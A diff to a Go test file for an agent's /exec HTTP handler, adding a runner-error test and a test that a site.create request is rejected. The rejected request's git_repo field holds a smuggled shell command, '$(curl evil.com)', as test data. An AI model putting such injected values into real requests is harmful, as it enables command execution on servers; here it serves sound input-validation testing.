@@ -3,6 +3,7 @@ package agent_test
 import (
 	"bufio"
 	"encoding/json"
+	"fmt"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -102,4 +103,49 @@ func TestExecHandler_MissingRequiredParam(t *testing.T) {
 	if w.Code != http.StatusUnprocessableEntity {
 		t.Errorf("expected 422, got %d", w.Code)
 	}
+}
+
+func TestExecHandler_RunnerError(t *testing.T) {
+	body := `{"command":"site.delete","params":{"domain":"test.com"}}`
+	h := agent.NewExecHandler(&errorRunner{})
+	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	w := httptest.NewRecorder()
+	h.ServeHTTP(w, req)
+	if w.Code != http.StatusOK {
+		t.Fatalf("expected 200 (streaming), got %d", w.Code)
+	}
+	// Should still emit a done line with code=1
+	scanner := bufio.NewScanner(w.Body)
+	var doneCode int = -1
+	for scanner.Scan() {
+		var line agent.ExecLine
+		if err := json.Unmarshal(scanner.Bytes(), &line); err != nil {
+			continue
+		}
+		if line.Type == "done" {
+			doneCode = line.Code
+		}
+	}
+	if doneCode != 1 {
+		t.Errorf("expected done.code=1, got %d", doneCode)
+	}
+}
+
+func TestExecHandler_RejectsGitRepoWithShellMetachars(t *testing.T) {
+	body := `{"command":"site.create","params":{"domain":"test.com","php_version":"8.2","tier":"small","tls":"none","git_repo":"http://example.com/$(curl evil.com)"}}`
+	h := agent.NewExecHandler(&stubRunner{})
+	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	w := httptest.NewRecorder()
+	h.ServeHTTP(w, req)
+	if w.Code != http.StatusUnprocessableEntity {
+		t.Errorf("expected 422, got %d", w.Code)
+	}
+}
+
+type errorRunner struct{}
+
+func (e *errorRunner) Run(args []string) (io.ReadCloser, error) {
+	return nil, fmt.Errorf("exec failed")
 }
